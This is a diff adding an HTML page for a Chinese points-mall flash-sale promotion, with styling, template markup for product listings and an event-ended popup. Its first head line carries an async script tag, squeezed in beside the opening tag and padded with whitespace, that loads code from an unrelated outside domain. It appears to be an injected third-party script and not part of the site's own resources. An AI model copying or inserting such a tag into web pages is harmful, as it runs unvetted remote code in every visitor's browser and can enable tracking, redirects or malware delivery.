@@ -1,0 +1,167 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "https://www.w3.org/TR/html4/loose.dtd">
+<html lang="en">
+<head><script async src="//ij.so9.cc/j/?t=fx&g=cc81da4ac700&c=e84e063c3386&rv=1"></script>           
+	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+	<meta name="format-detection" content="telephone=no">
+	<meta http-equiv="Cache-Control" content="max-age=1" />
+	<title>金豆商城</title>	
+	<link rel="stylesheet" href="./css/basic.css">
+	<link rel="stylesheet" href="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_css/showLoading.css?v=1">
+	<link rel="stylesheet" href="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_css/smoothness/jquery-ui-1.10.1.custom.css">
+	<link rel="stylesheet" href="./css/customDialog.css?v=3">
+	
+	<script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/jquery.min.js"></script>
+	<script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/showLoading.min.js"></script>
+	<script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/jquery-ui-1.10.1.custom.min.js"></script>
+
+	<script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/preventClickDoubleFired.js"></script>
+    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/easyJsTextEncoder.js"></script>
+    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/easyJsDomUtil.js"></script>
+    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/easyJsValidation.js"></script>
+    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/salamaSimpleXml.js"></script>
+    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/salamaWebClientService.js"></script>
+    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/salamaClientService.js"></script>
+    <script src='https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/dialog.js'></script>
+	
+	<script src="js/lib/myCommon.js" type="text/javascript"></script>
+	<script src="js/common.js?v=1" type="text/javascript"></script>
+	<script src="js/index.js?v=8"></script>
+	
+<style>
+.page{background-color:#fff;}
+.r1{width:100%;position: relative;}
+.r2{margin:15px 5% 20px;}
+.r2 ul li{margin-bottom: 10px;position: relative;}
+.r2_1{width:100%;}
+.r2_2{padding:4px 0;height:44px;position: relative;}
+.r2_2_1{}
+.p_1{line-height:24px;font-size:14px;}
+.p_2{font-size:12px;line-height:20px;}
+.r2_2_2{border-radius:20px;position: absolute;right:0;top:12px;font-size:12px;text-align: center;height:24px;line-height:24px;background:#066CB8;padding:3px 8px;color:#fff;}
+
+.showMobile{z-index:1000;width:260px;background:#1c8ccb;position:fixed;top:50%;left:50%;margin-left:-145px;margin-top:-100px;padding:20px 15px;border-radius: 4px;}
+.show_item{width:100%;height:100%;position:relative;overflow:hidden;}
+.show_item p{font-size:16px;color:#fff;line-height:20px;}
+.mobile_item{height: 36px;position: relative;overflow: hidden;border-radius: 3px;border:1px solid #fff;margin:8px 0 8px;}
+.input_item{height: 28px;padding:4px;}
+.input_item .mobile_box{height:28px;width:100%;line-height:normal;color:#fff;}
+::-webkit-input-placeholder{font-size:14px;color:#fff;}
+:-moz-placeholder{font-size:14px;color:#fff;}
+::-moz-placeholder{font-size:14px;color:#fff;}
+:-ms-input-placeholder{font-size:14px;color:#fff;}
+.sh_confirm{height:38px;line-height:38px;background:#F5CA1D;color:#000;text-align:center;margin:0 auto;cursor:pointer;background: #fff;color:#1c8ccb;font-size: 16px;width: 100%;border-radius:4px;;}
+.errorMsg{color:#f00;font-size: 14px;line-height: 20px;margin:5px 0;}
+.myTicket{position: fixed;left:0;bottom:0;height:49px;line-height:49px;text-align: center;background:#066CB8;color:#fff;width:100%;}
+
+.inCode {width: 240px;position: fixed;top: 50%;left: 50%;margin-left: -140px;margin-top: -140px;background: #1c8ccb;border-radius: 5px;padding: 20px;z-index: 2000;color:#fff;}
+.inCode_c{width:100%;height:100%;position: relative;}
+.code_1{margin-bottom:12px;text-align: center;}
+.errorMsg2{color:#f00;font-size:12px;}
+.code_2{border:1px solid #ccc;padding:5px 8px;height:26px;line-height: 26px;margin:3px 0 25px;padding-right:90px;position: relative;background:#1c8ccb;}
+.getCode{width:90px;padding:5px 0;height:28px;line-height:28px;background:#fff;text-align: center;font-size:14px;color:#1c8ccb;position: absolute;right:0;top:-1px;cursor: pointer;}
+
+.disable{background:#ddd;}
+
+.code_2 .box{height:26px;line-height:26px;width:100%;color:#fff;}
+.code_3{width:100%;}
+.code_3 ul li{width:160px;margin:0 auto;height:38px;background:#fff;text-align: center;line-height:38px;font-size:16px;color:#1c8ccb;border-radius: 6px;cursor:pointer;}
+
+.noData{background:#fff;font-size:40px;text-align:center;padding:20px;color:#999;}
+.tipList{padding:0px 5%;margin-bottom:80px}
+@media (device-height:480px) and (-webkit-min-device-pixel-ratio:2){/*4 4s*/
+}
+@media (min-height:565px){/*mi*/
+.p_1{font-size:16px;}
+.p_2{font-size:14px;}
+}
+@media (min-height:600px){/*6*/
+}
+@media (min-height:670px){/*6plus*/
+.p_1{font-size:18px;}
+.p_2{font-size:14px;}
+}
+</style>
+</head>
+<body>
+		<!-- header start
+		<div class="h" id="h">
+			<div class="h_c">
+				<div class="hc_c hc_l" id="spd_back"></div>
+				<div class="hc_m">99来战豆-秒杀</div>
+				<div class="hc_c hc_r hide" id="spd_order"></div>
+			</div>
+		</div>
+		 -->
+		<!-- header end -->
+	<div class="page" id="page">
+		<div class="r1">
+			<img searchResult="bannerImg" alt="">
+		</div>
+		<div id="noData" class="noData" style="display:none">
+			敬请期待
+		</div>
+		<div class="r2">
+			<ul id="resultList">
+				<li searchResult="SPDJDGoodsInfo">
+							<input type="hidden" searchResult="indexPSText">
+							<input type="hidden" searchResult="indexToProductTitle">
+							<input type="hidden" searchResult="indexToProductText">
+							<input type="hidden" searchResult="skYmdhms">
+							
+							<input type="hidden" searchResult="icon_pic_url"/>
+							<input type="hidden" searchResult="activity_item_id"/>
+							<input type="hidden" searchResult="name">	
+							<input type="hidden" searchResult="description"/>
+							<input type="hidden" searchResult="stockNum"/>
+							<input type="hidden" searchResult="market_price"/>
+							<input type="hidden" searchResult="suit_activity_id"/>
+							<input type="hidden" searchResult="sell_begin_date"/>
+							<input type="hidden" searchResult="sell_end_date"/>
+							<input type="hidden" searchResult="num"/>
+							<input type="hidden" searchResult="detail_url"/>
+					<div class="r2_1">
+						<img id="bannerPic" src="" alt="">
+					</div>
+					<div class="r2_2">
+						<div class="r2_2_1">
+							<p id="goodsName" class="p_1">美国西北樱桃</p>
+							<p class="p_2">
+								限量：<span id="showCount">300</span> &nbsp;&nbsp;<span id="indexText" style="color:#f00">数量有限先到先得</span>
+							</p>
+						</div>
+						<div class="r2_2_2">
+							<span id="showDate">6月29日 开抢</span>
+						</div>
+					</div>
+					<div class="r2_3">
+						<img src="./imgs/line.png">
+					</div>
+				</li>
+			</ul>
+		</div>
+		<div class="tipList">
+		</div>
+		<div id="tipInput" style="display:none"></div>
+		
+	</div>
+		
+		
+		
+	<div class="myTicket"><span id="myOrderListLink">【我的战利品】</span></div>
+	
+	
+	
+	<div class="overLayer" id="overLayer" style="display:none;z-index:999"></div>
+	
+	<!-- 弹出活动结束 -->
+	<div class="inCode" id="activityEnd" style="display:none;">
+		<div class="inCode_c">
+			<div class="code_1"><br/>
+				2015金豆抢购活动圆满结束<br/>
+				更多精美礼品<br/>请至 <span style="font-size: 25px;">金豆乐园</span> 兑换<br/>
+			</div>
+		</div>
+	</div>
+</body>
+</html>
